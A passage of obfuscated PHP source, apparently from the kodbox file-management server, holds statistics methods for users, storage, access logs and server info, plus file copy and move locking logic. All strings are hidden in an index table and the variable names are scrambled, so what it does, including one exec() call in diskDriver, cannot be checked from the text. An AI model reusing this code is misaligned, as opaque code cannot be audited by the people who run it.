$½âÏçöƒ, $Ğ˜İíª©); } public function trendList($îáóø÷) { $ÊË¯ˆ =& $_SERVER[ìïæ“œî]; $…ø•°Úë = $this->listData(); if ($…ø•°Úë) { $…Ëœäåô = end($…ø•°Úë); $Ô¥Ö²¶ı = date($ÊË¯ˆ[1882], strtotime($ÊË¯ˆ[1883])); if ($…Ëœäåô[$ÊË¯ˆ[255]] == $Ô¥Ö²¶ı) { return $…ø•°Úë; } $û¶Ÿ–Œ = strtotime($…Ëœäåô[$ÊË¯ˆ[255]]); } if (!isset($û¶Ÿ–Œ)) { $øà¤·èé = $îáóø÷ == $ÊË¯ˆ[662] ? $ÊË¯ˆ[598] : $ÊË¯ˆ[873]; $û¶Ÿ–Œ = Model($øà¤·èé)->min($ÊË¯ˆ[231]); } $»´ÜÅ²ï = $ÊË¯ˆ[1884] . ucfirst($îáóø÷); $‚„Çø™Á = $this->dateList($û¶Ÿ–Œ); foreach ($‚„Çø™Á as $Ô¥Ö²¶ı) { $this->{$»´ÜÅ²ï}($Ô¥Ö²¶ı); } return $this->listData(); } private function dateList($“ÓÈ–ÒØ) { $™á£íÜÜ =& $_SERVER[ìïæ“œî]; $©’ä½Ÿ¹ = $“ÓÈ–ÒØ; $µÂÓ•€· = strtotime($™á£íÜÜ[1883]); $İø®ß¸ = array(); while ($©’ä½Ÿ¹ <= $µÂÓ•€·) { $İø®ß¸[] = date($™á£íÜÜ[1882], $©’ä½Ÿ¹); $©’ä½Ÿ¹ = strtotime($™á£íÜÜ[1885], $©’ä½Ÿ¹); } return $İø®ß¸; } public function _recordUser($´ÏÜÔî = '') { $İ×€ç©” =& $_SERVER[ìïæ“œî]; $µ›÷¼£± = strtotime(date($İ×€ç©”[1886], strtotime($´ÏÜÔî))); $áççè¯ì = strtotime(date($İ×€ç©”[1887], strtotime($´ÏÜÔî))); $²ú¾¬”· = array($İ×€ç©”[231] => array($İ×€ç©”[1068], $áççè¯ì)); $Ì†ÉÉ¹ß = Model($İ×€ç©”[598])->where($²ú¾¬”·)->count($İ×€ç©”[1747]); $²ú¾¬”·[$İ×€ç©”[231]] = array($İ×€ç©”[409], array($µ›÷¼£±, $áççè¯ì)); $İƒÁ£¼“ = Model($İ×€ç©”[598])->where($²ú¾¬”·)->count($İ×€ç©”[1747]); $²ú¾¬”·[$İ×€ç©”[33]] = $İ×€ç©”[1888]; $£Ì–¯ˆÕ = Model($İ×€ç©”[1889])->where($²ú¾¬”·)->count($İ×€ç©”[1890]); $Øõ‚¨©¶ = array($İ×€ç©”[255] => $´ÏÜÔî, $İ×€ç©”[814] => (int) $Ì†ÉÉ¹ß, $İ×€ç©”[1875] => (int) $İƒÁ£¼“, $İ×€ç©”[1876] => (int) $£Ì–¯ˆÕ); return $this->insert($Øõ‚¨©¶); } public function _recordStore($©¿˜óÕ‹ = '') { $ÀÓä˜  =& $_SERVER[ìïæ“œî]; $ŠóÈùÙ = strtotime(date($ÀÓä˜ [1887], strtotime($©¿˜óÕ‹))); $¦ö¼ÒºÅ = array($ÀÓä˜ [231] => array($ÀÓä˜ [1068], $ŠóÈùÙ)); $’š“ÔÚÕ = Model($ÀÓä˜ [544])->where($¦ö¼ÒºÅ)->sum($ÀÓä˜ [79]); $¦ö¼ÒºÅ[$ÀÓä˜ [485]] = 0; $Œ”âû› = Model($ÀÓä˜ [873])->where($¦ö¼ÒºÅ)->sum($ÀÓä˜ [79]); $¦ö¼ÒºÅ[$ÀÓä˜ [190]] = 1; $•²óÓ°Ò = Model($ÀÓä˜ [873])->where($¦ö¼ÒºÅ)->sum($ÀÓä˜ [79]); $¦ö¼ÒºÅ[$ÀÓä˜ [190]] = 2; $šŠşåĞ¶ = Model($ÀÓä˜ [873])->where($¦ö¼ÒºÅ)->sum($ÀÓä˜ [79]); $ÙùÊµÕ = array($ÀÓä˜ [255] => $©¿˜óÕ‹, $ÀÓä˜ [812] => (int) $Œ”âû›, $ÀÓä˜ [1879] => (int) $’š“ÔÚÕ, $ÀÓä˜ [1880] => (int) $•²óÓ°Ò, $ÀÓä˜ [1881] => (int) $šŠşåĞ¶); return $this->insert($ÙùÊµÕ); } public function trend($í³¹ëã, $óÂø›¹†) { $ÅæÆ÷ï˜ =& $_SERVER[ìïæ“œî]; if (!$this->init($í³¹ëã)) { return !1; } $ç·ÃÙ×û = $this->trendList($í³¹ëã); if ($ç·ÃÙ×û && $óÂø›¹† != $ÅæÆ÷ï˜[1720]) { $ê»æü² = $ç·ÃÙ×û[0][$ÅæÆ÷ï˜[255]]; $Ò‡½ù‡ƒ = $this->validDate($óÂø›¹†, $ê»æü²); $úˆ·Âæ· = array(); $ğ‚­ä­ô = array_to_keyvalue($ç·ÃÙ×û, $ÅæÆ÷ï˜[255]); foreach ($Ò‡½ù‡ƒ as $ƒâ˜Ô¹ı) { if (isset($ğ‚­ä­ô[$ƒâ˜Ô¹ı])) { $ğ«û…Õú = $ğ‚­ä­ô[$ƒâ˜Ô¹ı]; } else { $ğ«û…Õú = end($ç·ÃÙ×û); $ğ«û…Õú[$ÅæÆ÷ï˜[255]] = $ƒâ˜Ô¹ı; if ($í³¹ëã == $ÅæÆ÷ï˜[662]) { $ğ«û…Õú[$ÅæÆ÷ï˜[1875]] = $ğ«û…Õú[$ÅæÆ÷ï˜[1876]] = 0; } } $úˆ·Âæ·[] = $ğ«û…Õú; } $ç·ÃÙ×û = $úˆ·Âæ·; } $§÷áæô = array($ÅæÆ÷ï˜[662] => array($ÅæÆ÷ï˜[814] => LNG($ÅæÆ÷ï˜[1891]), $ÅæÆ÷ï˜[1875] => LNG($ÅæÆ÷ï˜[1892]), $ÅæÆ÷ï˜[1876] => LNG($ÅæÆ÷ï˜[1893])), $ÅæÆ÷ï˜[1877] => array($ÅæÆ÷ï˜[812] => LNG($ÅæÆ÷ï˜[1894]), $ÅæÆ÷ï˜[1879] => LNG($ÅæÆ÷ï˜[1895]), $ÅæÆ÷ï˜[1880] => LNG($ÅæÆ÷ï˜[1896]), $ÅæÆ÷ï˜[1881] => LNG($ÅæÆ÷ï˜[1897]))); $Á”ûì¾ = array($ÅæÆ÷ï˜[662] => $ÅæÆ÷ï˜[1898], $ÅæÆ÷ï˜[1877] => $ÅæÆ÷ï˜[79]); if (empty($ç·ÃÙ×û)) { $ƒâ˜Ô¹ı = date($ÅæÆ÷ï˜[1882], strtotime($ÅæÆ÷ï˜[1883])); $Âş™¸ü  = array($ÅæÆ÷ï˜[255] => $ƒâ˜Ô¹ı); foreach ($§÷áæô[$í³¹ëã] as $ôÙ±•ó÷ => $ïü¼Ó¤Ê) { $Âş™¸ü [$ôÙ±•ó÷] = 0; } $ç·ÃÙ×û[] = $Âş™¸ü ; } $µÛÁ´Ÿ = array(); foreach ($ç·ÃÙ×û as $ïü¼Ó¤Ê) { if ($í³¹ëã == $ÅæÆ÷ï˜[1877] && $ïü¼Ó¤Ê[$ÅæÆ÷ï˜[1879]] > $ïü¼Ó¤Ê[$ÅæÆ÷ï˜[812]]) { $ïü¼Ó¤Ê[$ÅæÆ÷ï˜[1879]] = $ïü¼Ó¤Ê[$ÅæÆ÷ï˜[812]]; } foreach ($§÷áæô[$í³¹ëã] as $ôÙ±•ó÷ => $¯Ä‹¤­Ä) { $ğ«û…Õú = array($ÅæÆ÷ï˜[255] => $ïü¼Ó¤Ê[$ÅæÆ÷ï˜[255]], $ÅæÆ÷ï˜[1636] => $¯Ä‹¤­Ä); $ğ«û…Õú[$Á”ûì¾[$í³¹ëã]] = isset($ïü¼Ó¤Ê[$ôÙ±•ó÷]) ? $ïü¼Ó¤Ê[$ôÙ±•ó÷] : 0; $µÛÁ´Ÿ[] = $ğ«û…Õú; } } return $µÛÁ´Ÿ; } public function validDate($½¹„ßæÚ, $“ÁŒË°´) { $œä—óñÜ =& $_SERVER[ìïæ“œî]; $¨Ä¨Ğçâ = date($œä—óñÜ[1882], strtotime($œä—óñÜ[1883])); $×ÊÛñ¢£ = array($¨Ä¨Ğçâ); switch ($½¹„ßæÚ) { case $œä—óñÜ[1727]: $ÈÄ·õíó = mktime(0, 0, 0, date($œä—óñÜ[1899]), date($œä—óñÜ[1426]) - date($œä—óñÜ[1518]) + 7 - 7, date($œä—óñÜ[1900])); $ññºÏè½ = 0; do { $‹ŸÕşŒİ = date($œä—óñÜ[1882], $ÈÄ·õíó - 3600 * 24 * 7 * $ññºÏè½); $×ÊÛñ¢£[] = $‹ŸÕşŒİ; $ññºÏè½++; } while ($“ÁŒË°´ < $‹ŸÕşŒİ); break; case $œä—óñÜ[1725]: $ññºÏè½ = 1; do { $×†¡ÅÁë = date($œä—óñÜ[1901], strtotime("\55\x20{$ññºÏè½}\40\x6d\157\x6e\x74\x68\x73")); $×ÊÛñ¢£[] = $×†¡ÅÁë; $ññºÏè½++; } while ($“ÁŒË°´ < $×†¡ÅÁë); break; case $œä—óñÜ[1902]: $—ä¹‘ßĞ = (int) date($œä—óñÜ[1900], strtotime($“ÁŒË°´)); $ÖÀüø‰Ë = (int) date($œä—óñÜ[1900]); if ($—ä¹‘ßĞ >= $ÖÀüø‰Ë) { break; } for ($—ä¹‘ßĞ; $—ä¹‘ßĞ < $ÖÀüø‰Ë; $—ä¹‘ßĞ++) { $×ÊÛñ¢£[] = $—ä¹‘ßĞ . $œä—óñÜ[1903]; } break; default: break; } if ($“ÁŒË°´ > end($×ÊÛñ¢£)) { array_pop($×ÊÛñ¢£); } sort($×ÊÛñ¢£); return $×ÊÛñ¢£; } public function listTable($œÃê‚æ) { $ô§œøææ = ucfirst($œÃê‚æ); return Model($ô§œøææ)->listData(); } public function option($çÏ®—ˆÖ) { $¾ô‡İ‚ = $_SERVER[ìïæ“œî][1904] . ucfirst($çÏ®—ˆÖ); return $this->{$¾ô‡İ‚}(); } private function optionUser() { $€âØµÔ÷ =& $_SERVER[ìïæ“œî]; $˜¤Âòœ = Model($€âØµÔ÷[598])->count($€âØµÔ÷[1747]); $‘½–­Ò = Model($€âØµÔ÷[598])->where($€âØµÔ÷[1905])->count($€âØµÔ÷[1747]); $ıÎ†®é = intval($GLOBALS[$€âØµÔ÷[6]][$€âØµÔ÷[425]][$€âØµÔ÷[1693]]) / 3600; $ìÏ­®¬Ã = strtotime("\55{$ıÎ†®é}\x20\150\157\165\x72\x73"); $ÆÚœËî„ = strtotime(date($€âØµÔ÷[1886])); if ($ìÏ­®¬Ã < $ÆÚœËî„) { $ìÏ­®¬Ã = $ÆÚœËî„; } $«’ü°‚¶ = array($€âØµÔ÷[1906] => array($€âØµÔ÷[1069], $ìÏ­®¬Ã)); $ééÌ‰¥ = (int) Model($€âØµÔ÷[598])->where($«’ü°‚¶)->count($€âØµÔ÷[1747]); if (!$ééÌ‰¥) { $ééÌ‰¥ = 1; } $«’ü°‚¶ = array($€âØµÔ÷[1906] => array($€âØµÔ÷[1069], $ÆÚœËî„)); $²²¸£ÚÔ = Model($€âØµÔ÷[598])->where($«’ü°‚¶)->count($€âØµÔ÷[1747]); return array($€âØµÔ÷[807] => (int) $˜¤Âòœ, $€âØµÔ÷[1907] => (int) ($˜¤Âòœ - $‘½–­Ò), $€âØµÔ÷[1908] => (int) $‘½–­Ò, $€âØµÔ÷[1909] => (int) $²²¸£ÚÔ, $€âØµÔ÷[1910] => $ééÌ‰¥); } private function optionFile() { $òÊøïİÕ =& $_SERVER[ìïæ“œî]; $†¿ãà·ò = $this->sourceSize(); $‘­Ë‰àæ = $†¿ãà·ò[$òÊøïİÕ[79]]; $òÔÊ„ = $†¿ãà·ò[$òÊøïİÕ[1879]]; $»§ƒÕÈË = Model($òÊøïİÕ[873])->where(array($òÊøïİÕ[485] => 0))->count($òÊøïİÕ[193]); $şÆäá÷ = array($òÊøïİÕ[485] => 0, $òÊøïİÕ[231] => array($òÊøïİÕ[1069], strtotime(date($òÊøïİÕ[1886])))); $×ï¿¯« = Model($òÊøïİÕ[873])->where($şÆäá÷)->sum($òÊøïİÕ[79]); $‚ò²ËÅ¡ = Model($òÊøïİÕ[873])->where($şÆäá÷)->count($òÊøïİÕ[193]); return array($òÊøïİÕ[812] => $‘­Ë‰àæ, $òÊøïİÕ[1879] => $òÔÊ„, $òÊøïİÕ[1911] => $‘­Ë‰àæ - $òÔÊ„, $òÊøïİÕ[1912] => (int) $×ï¿¯«, $òÊøïİÕ[814] => (int) $»§ƒÕÈË, $òÊøïİÕ[1913] => (int) $‚ò²ËÅ¡); } private function optionAccess() { $Û­‚ÏÅı =& $_SERVER[ìïæ“œî]; return array($Û­‚ÏÅı[807] => $this->typeLogCnt(), $Û­‚ÏÅı[110] => $this->typeLogCnt($Û­‚ÏÅı[110]), $Û­‚ÏÅı[525] => $this->typeLogCnt($Û­‚ÏÅı[525]), $Û­‚ÏÅı[1914] => $this->typeLogCnt($Û­‚ÏÅı[1914]), $Û­‚ÏÅı[1915] => $this->typeLogCnt($Û­‚ÏÅı[1915]), $Û­‚ÏÅı[662] => $this->typeLogCnt($Û­‚ÏÅı[12], $Û­‚ÏÅı[1890])); } private function typeLogCnt($ªŸ¤Æı„ = '', $äâæ´İ— = "\x69\x64") { $·ÂÀïë =& $_SERVER[ìïæ“œî]; $ğÓÓÄË = array($·ÂÀïë[110] => array($·ÂÀïë[1916], $·ÂÀïë[1917]), $·ÂÀïë[525] => array($·ÂÀïë[1918], $·ÂÀïë[1919]), $·ÂÀïë[1914] => array($·ÂÀïë[1920], $·ÂÀïë[1921], $·ÂÀïë[1922]), $·ÂÀïë[1915] => array($·ÂÀïë[1923], $·ÂÀïë[1924]), $·ÂÀïë[1925] => array($·ÂÀïë[1926], $·ÂÀïë[1927], $·ÂÀïë[1928])); $ïï‘°„ = strtotime(date($·ÂÀïë[1886])); $ëØ°ó´› = array($·ÂÀïë[231] => array($·ÂÀïë[1069], $ïï‘°„)); if ($ªŸ¤Æı„) { $ëØ°ó´›[$·ÂÀïë[33]] = array($·ÂÀïë[7], $ğÓÓÄË[$ªŸ¤Æı„]); } $òË“ÃÉ = Model($·ÂÀïë[1889])->where($ëØ°ó´›)->count($äâæ´İ—); return (int) $òË“ÃÉ; } private function optionServer() { $›áïıÙƒ =& $_SERVER[ìïæ“œî]; $¨ Ñ½‹ı = $this->diskDriver(); $Şâ¤Î¦ = KodIO::defaultDriver(); $ì©…¾ï = array($›áïıÙƒ[866] => $Şâ¤Î¦[$›áïıÙƒ[475]]); $­£¦¥Û = Model($›áïıÙƒ[544])->where($ì©…¾ï)->sum($›áïıÙƒ[79]); $¨å›şÙÏ = explode($›áïıÙƒ[53], $_SERVER[$›áïıÙƒ[147]]); $¦’ƒ“µÕ = $¨å›şÙÏ[0]; $å‡ìĞô´ = $GLOBALS[$›áïıÙƒ[6]][$›áïıÙƒ[21]]; $ŞÊ°Ğà  = $å‡ìĞô´[$›áïıÙƒ[1031]]; if ($ŞÊ°Ğà  == $›áïıÙƒ[1019]) { $¡İŸÀ¦É = explode($›áïıÙƒ[1345], $å‡ìĞô´[$›áïıÙƒ[1030]]); $ŞÊ°Ğà  = $¡İŸÀ¦É[0]; } if ($ŞÊ°Ğà  == $›áïıÙƒ[967] || $ŞÊ°Ğà  == $›áïıÙƒ[853]) { $ß¤º¾ïâ = Model()->db()->query($›áïıÙƒ[1929]); $’†“ôËÖ = $ß¤º¾ïâ[0] && isset($ß¤º¾ïâ[0][$›áïıÙƒ[1635]]) ? $ß¤º¾ïâ[0][$›áïıÙƒ[1635]] : 0; $ŞÊ°Ğà  = $›áïıÙƒ[1930] . ($’†“ôËÖ ? $›áïıÙƒ[8] . $’†“ôËÖ : $›áïıÙƒ[12]); } $Í˜Ãà¤ü = $GLOBALS[$›áïıÙƒ[6]][$›áïıÙƒ[425]][$›áïıÙƒ[875]]; return array($›áïıÙƒ[1931] => $¨ Ñ½‹ı ? $¨ Ñ½‹ı[$›áïıÙƒ[1932]] : 0, $›áïıÙƒ[1933] => $¨ Ñ½‹ı ? $¨ Ñ½‹ı[$›áïıÙƒ[1934]] : 0, $›áïıÙƒ[1935] => (int) $Şâ¤Î¦[$›áïıÙƒ[1932]] * 1024 * 1024 * 1024, $›áïıÙƒ[1936] => (int) $­£¦¥Û, $›áïıÙƒ[1937] => ucfirst($¦’ƒ“µÕ), $›áïıÙƒ[1938] => $›áïıÙƒ[1939] . PHP_VERSION, $›áïıÙƒ[1940] => phpBuild64() ? 64 : 32, $›áïıÙƒ[806] => str_replace($›áïıÙƒ[1188], $›áïıÙƒ[1047], $ŞÊ°Ğà ), $›áïıÙƒ[425] => ucfirst($Í˜Ãà¤ü), $›áïıÙƒ[32] => $_SERVER[$›áïıÙƒ[1941]]); } private function diskDriver() { $ÍŠÕó =& $_SERVER[ìïæ“œî]; $õ×’ ØË = $ÍŠÕó[8]; $ö¡¾Ö¶£ = $GLOBALS[$ÍŠÕó[6]][$ÍŠÕó[1362]] == $ÍŠÕó[1363]; if ($ö¡¾Ö¶£) { $õ×’ ØË = $ÍŠÕó[1942]; if (function_exists($ÍŠÕó[1943])) { exec($ÍŠÕó[1944], $³á‘¶î¨); $õ×’ ØË = $³á‘¶î¨[1] . $ÍŠÕó[8]; } } if (!file_exists($õ×’ ØË)) { return; } if (!function_exists($ÍŠÕó[1945])) { return; } $ãÁò™‚Ê = @disk_total_space($õ×’ ØË); $ÑíÎÎÓê = $ãÁò™‚Ê - @disk_free_space($õ×’ ØË); return array($ÍŠÕó[1932] => $ãÁò™‚Ê, $ÍŠÕó[1934] => $ÑíÎÎÓê); } public function fileChart($¥¡ÍªôË) { $ÔªÎäãï =& $_SERVER[ìïæ“œî]; if (isset($¥¡ÍªôË[$ÔªÎäãï[1747]])) { return Model($ÔªÎäãï[873])->userFileTypeProfile($¥¡ÍªôË[$ÔªÎäãï[1747]]); } if (isset($¥¡ÍªôË[$ÔªÎäãï[1946]])) { return Model($ÔªÎäãï[873])->groupFileTypeProfile($¥¡ÍªôË[$ÔªÎäãï[1946]]); } $½âáÙ’Ò = $this->sourceSize(); $›Æ“™¦“ = array($ÔªÎäãï[192] => 0, $ÔªÎäãï[190] => 1); $íü¤Šƒ = Model($ÔªÎäãï[873])->where($›Æ“™¦“)->sum($ÔªÎäãï[79]); $›Æ“™¦“[$ÔªÎäãï[190]] = 2; $êå–‘ = Model($ÔªÎäãï[873])->where($›Æ“™¦“)->sum($ÔªÎäãï[79]); return array($ÔªÎäãï[812] => $½âáÙ’Ò[$ÔªÎäãï[79]], $ÔªÎäãï[1879] => $½âáÙ’Ò[$ÔªÎäãï[1879]], $ÔªÎäãï[1880] => (int) $íü¤Šƒ, $ÔªÎäãï[1881] => (int) $êå–‘); } private function sourceSize() { $Õ¡›óíÛ =& $_SERVER[ìïæ“œî]; $‚àĞ“Ñ = Model($Õ¡›óíÛ[873])->where(array($Õ¡›óíÛ[485] => 0))->sum($Õ¡›óíÛ[79]); $¬À€èÎ÷ = Model($Õ¡›óíÛ[544])->sum($Õ¡›óíÛ[79]); if ($¬À€èÎ÷ > $‚àĞ“Ñ) { $¬À€èÎ÷ = $‚àĞ“Ñ; } return array($Õ¡›óíÛ[79] => (int) $‚àĞ“Ñ, $Õ¡›óíÛ[1879] => (int) $¬À€èÎ÷); } } goto Fµ´£ÁğÔ´; FÃ—”É‹½ˆ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ã¼Üşà) { $¸Â÷ûØ =& $_SERVER[ìïæ“œî]; if (!$this->allowLock()) { return; } $this->_lockCheck($¸Â÷ûØ[618], $Ã¼Üşà); $ÜôÛ¹³• = 1; $this->_lockEvent($Ã¼Üşà, array($¸Â÷ûØ[619], $¸Â÷ûØ[620]), $ÜôÛ¹³•); $this->_lockParent($Ã¼Üşà, array($¸Â÷ûØ[620]), $ÜôÛ¹³•); $this->_lockEvent($Ã¼Üşà, array($¸Â÷ûØ[621], $¸Â÷ûØ[622]), $ÜôÛ¹³•); $this->_lockCheckEnd($¸Â÷ûØ[618], $Ã¼Üşà); } public function lockCopyEnd($Œè•ÄŠ) { $µ€âŒ¢ =& $_SERVER[ìïæ“œî]; if (!$this->allowLock()) { return; } $ü”Óë’ã = 0; $this->_lockEvent($Œè•ÄŠ, array($µ€âŒ¢[619], $µ€âŒ¢[620]), $ü”Óë’ã); $this->_lockParent($Œè•ÄŠ, array($µ€âŒ¢[620]), $ü”Óë’ã); $this->_lockEvent($Œè•ÄŠ, array($µ€âŒ¢[621], $µ€âŒ¢[622]), $ü”Óë’ã); } public function lockWriteStart($›¤¯ºÌ, $£àÇ¬Û = '') { $—Øà›øû =& $_SERVER[ìïæ“œî]; if (!$this->allowLock()) { return; } $this->_lockCheck($—Øà›øû[619], $›¤¯ºÌ); $âÊ°äìæ = 1; $this->_lockKey($—Øà›øû[623] . $›¤¯ºÌ . $—Øà›øû[10] . $£àÇ¬Û, $âÊ°äìæ); $this->_lockEvent($›¤¯ºÌ, array($—Øà›øû[618], $—Øà›øû[620]), $âÊ°äìæ); $this->_lockParent($›¤¯ºÌ, array($—Øà›øû[618], $—Øà›øû[620]), $âÊ°äìæ); $this->_lockCheckEnd($—Øà›øû[619], $›¤¯ºÌ); } public function lockWriteEnd($óØö¬Æ‰, $ÓÁîıúş = '') { $Ôè‡õØß =& $_SERVER[ìïæ“œî]; if (!$this->allowLock()) { return; } $ÀßçŠ–¯ = 0; $this->_lockKey($Ôè‡õØß[623] . $óØö¬Æ‰ . $Ôè‡õØß[10] . $ÓÁîıúş, $ÀßçŠ–¯); $this->_lockEvent($óØö¬Æ‰, array($Ôè‡õØß[618], $Ôè‡õØß[620]), $ÀßçŠ–¯); $this->_lockParent($óØö¬Æ‰, array($Ôè‡õØß[618], $Ôè‡õØß[620]), $ÀßçŠ–¯); } public function lockMoveStart($´—î›û®) { $­¢Œıµâ =& $_SERVER[ìïæ“œî]; if (!$this->allowLock()) { return; } $this->_lockCheck($­¢Œıµâ[620], $´—î›û®); $ÚÕ–µ† = 1; $this->_lockKey($­¢Œıµâ[624] . $´—î›û®, $ÚÕ–µ†); $this->_lockEvent($´—î›û®, array($­¢Œıµâ[618], $­¢Œıµâ[619]), $ÚÕ–µ†); $this->_lockParent($´—î›û®, array($­¢Œıµâ[618], $­¢Œıµâ[620]), $ÚÕ–µ†); $this->_lockEvent($´—î›û®, array($­¢Œıµâ[625], $­¢Œıµâ[621], $­¢Œıµâ[622]), $ÚÕ–µ†); $this->_lockCheckEnd($­¢Œıµâ[620], $´—î›û®); } public function lockMoveEnd($±æÏÌï) { $—½¹¿”Ô =& $_SERVER[ìïæ“œî]; if (!$this->allowLock()) { return; } $¾€×Åœî = 0; $this->_lockKey($—½¹¿”Ô[624] . $±æÏÌï, $¾€×Åœî); $this->_lockEvent($±æÏÌï, array($—½¹¿”Ô[618], $—½¹¿”Ô[619]), $¾€×Åœî); $this->_lockParent($±æÏÌï, array($—½¹¿”Ô[618], $—½¹¿”Ô[620]), $¾€×Åœî); $this->_lockEvent($±æÏÌï, array($—½¹¿”Ô[625], $—½¹¿”Ô[621], $—½¹¿”Ô[622]), $¾€×Åœî); } private function _lockCheck($ˆôèÅ, $­ÉŠæ°) { $µÓ¢Š·ª =& $_SERVER[ìïæ“œî]; $Šœü£Ó = $this->sourceInfo($­ÉŠæ°); $¼ôÑ– = $ˆôèÅ . $µÓ¢Š·ª[10] . $­ÉŠæ°; $this->_lockTimeStart[$¼ôÑ–] = timeFloat(); if (!is_array($Šœü£Ó)) { return; } $ªé¿øÅ = LNG($µÓ¢Š·ª[626]); CacheLock::setErrorMsg($µÓ¢Š·ª[176] . htmlspecialchars($Šœü£Ó[$µÓ¢Š·ª[32]]) . $µÓ¢Š·ª[178] . $ªé¿øÅ); $this->_lockKey($¼ôÑ–, 1); $this->_lockKey($¼ôÑ–, 0); $™ãÓ¹€à = array_reverse($this->parentLevelArray($Šœü£Ó[$µÓ¢Š·ª[584]])); foreach ($™ãÓ¹€à as $ş“Ì§‹ı) { $¼ôÑ– = $ˆôèÅ . $µÓ¢Š·ª[627] . $ş“Ì§‹ı; if (CacheLock::lockGet($µÓ¢Š·ª[628] . $¼ôÑ–)) { $Šœü£Ó = $this->sourceInfo($ş“Ì§‹ı); CacheLock::setErrorMsg($µÓ¢Š·ª[176] . htmlspecialchars($Šœü£Ó[$µÓ¢Š·ª[32]]) . $µÓ¢Š·ª[178] . $ªé¿øÅ); $this->_lockKey($¼ôÑ–, 1); $this->_lockKey($¼ôÑ–, 0); } } } private function _lockCheckEnd($é Å¾Â, $ªŒ½ƒµ) { $«Î‡ßû =& $_SERVER[ìïæ“œî]; $üÇ¬÷Ï´ = $é Å¾Â . $«Î‡ßû[10] . $ªŒ½ƒµ; CacheLock::setErrorMsg($«Î‡ßû[454]); if (!isset($this->_lockTimeStart[$üÇ¬÷Ï´])) { return; } $îâÂÑªğ = timeFloat() - $this->_lockTimeStart[$üÇ¬÷Ï´]; unset($this->_lockTimeStart[$üÇ¬÷Ï´]); if ($îâÂÑªğ > 0.5) { unset(self::$cacheSourceInfo[$«Î‡ßû[533] . $ªŒ½ƒµ]); } $Ä»¢©ñı = $this->sourceInfo($ªŒ½ƒµ); if (!$Ä»¢©ñı) { show_json(LNG($«Î‡ßû[108]), !1); } } private function _lockParent($Ì²ëàí—, $ÅøÈ¼‡Û, $×æÀˆ÷°) { if (!$this->autoLockSet) { return; } $„ÓŠ¥üé = $this->sourceInfo($Ì²ëàí—); if (!is_array($„ÓŠ¥üé)) { return; } $î±©¢„€ = array_reverse($this->parentLevelArray($„ÓŠ¥üé[$_SERVER[ìïæ“œî][584]])); foreach ($î±©¢„€ as $© šÀ«˜) { $this->_lockEvent($© šÀ«˜, $ÅøÈ¼‡Û, $×æÀˆ÷°); } } private function _lockEvent($ûõÎ’è´, $‘ğ¨‚üƒ, $Öàš¤€È) { $‰«øöÓÑ =& $_SERVER[ìïæ“œî]; if (!$this->autoLockSet) { return; } foreach ($‘ğ¨‚üƒ as $î°¹›Øˆ) { $ç§ÇŒ ® = $î°¹›Øˆ . $‰«øöÓÑ[10] . $ûõÎ’è´; if ($Öàš¤€È && CacheLock::lockGet($‰«øöÓÑ[628] . $ç§ÇŒ ®)) { continue; } $this->_lockKey($ç§ÇŒ ®, $Öàš¤€È); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Éæ»ÄÄ, $Ñíƒö€ = 1) { $ßš«£ˆé = $_SERVER[ìïæ“œî][628] . md5($Éæ»ÄÄ); if ($Ñíƒö€) { if (isset(self::$_lockItemArr[$ßš«£ˆé])) { return; } self::$_lockItemArr[$ßš«£ˆé] = 1; CacheLock::lock($ßš«£ˆé, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ßš«£ˆé])) { return; } unset(self::$_lockItemArr[$ßš«£ˆé]); CacheLock::unlock($ßš«£ˆé); } } public function isParentOf($õ‰Ä·ÅÒ, $ôÀ—Ç÷’) { $äÁ›¼ =& $_SERVER[ìïæ“œî]; $ó¡Àƒéæ = $this->sourceInfo($õ‰Ä·ÅÒ); $ªÜİŠØµ = $this->sourceInfo($ôÀ—Ç÷’); $Ğš‹›£¬ = $ó¡Àƒéæ[$äÁ›¼[584]] . $ó¡Àƒéæ[$äÁ›¼[193]] . $äÁ›¼[50]; $ÔœƒèÉú = $ªÜİŠØµ[$äÁ›¼[584]] . $ªÜİŠØµ[$äÁ›¼[193]] . $äÁ›¼[50]; $Êß‘« = strpos($ÔœƒèÉú, $Ğš‹›£¬) === 0; return $Êß‘«; } private $targetIsDelete = 0; public function copy($·ìÙ†Æî, $ÎªªÊßß, $÷ñÚ½ÑÂ = REPEAT_REPLACE, $§¼Çè©¼ = '') { $×–’ÁÙ =& $_SERVER[ìïæ“œî]; $ªşĞ¤·ö = $this->sourceInfo($·ìÙ†Æî); $ñ»›¾„ = $this->sourceInfo($ÎªªÊßß); if (!$ªşĞ¤·ö || !$ñ»›¾„ || $ñ»›¾„[$×–’ÁÙ[485]] != $×–’ÁÙ[91]) { return !1; } if ($this->isParentOf($·ìÙ†Æî, $ÎªªÊßß)) { return !1; } $­æÆ‡¢ = $§¼Çè©¼ ? $§¼Çè©¼ : $ªşĞ¤·ö[$×–’ÁÙ[32]]; $this->lockCopyStart($·ìÙ†Æî); $this->lockWriteStart($ÎªªÊßß, $­æÆ‡¢); $¶ª¯Ã•‹ = array($×–’ÁÙ[629] => array(), $×–’ÁÙ[630] => array(), $×–’ÁÙ[631] => array()); $this->targetIsDelete = intval($ªşĞ¤·ö[$×–’ÁÙ[505]]); $¤Ïú¨®Ë = $this->fileNameExistAuto($ÎªªÊßß, $ªşĞ¤·ö); $ïÀšéûÇ = $this->_copy($·ìÙ†Æî, $ÎªªÊßß, $÷ñÚ½ÑÂ, $¶ª¯Ã•‹, !0, $§¼Çè©¼); $this->_childrenListClear(); $this->lockCopyEnd($·ìÙ†Æî); $this->lockWriteEnd($ÎªªÊßß, $­æÆ‡¢); if ($ªşĞ¤·ö[$×–’ÁÙ[485]] == $×–’ÁÙ[91] && $¤Ïú¨®Ë == $ïÀšéûÇ) { $this->folderSizeResetChildren($¤Ïú¨®Ë); } Model($×–’ÁÙ[632])->addAll($¶ª¯Ã•‹[$×–’ÁÙ[630]], array(), !0); if ($¤Ïú¨®Ë != $ïÀšéûÇ || $ªşĞ¤·ö[$×–’ÁÙ[485]] == $×–’ÁÙ[91]) { Model($×–’ÁÙ[633])->eventCopy($ïÀšéûÇ); } $this->saveAll($¶ª¯Ã•‹[$×–’ÁÙ[631]]); Model($×–’ÁÙ[230])->linkAdd($¶ª¯Ã•‹[$×–’ÁÙ[629]]); $this->folderSizeReset($ÎªªÊßß); $this->updateModifyTime($ÎªªÊßß); return $ïÀšéûÇ; } private function 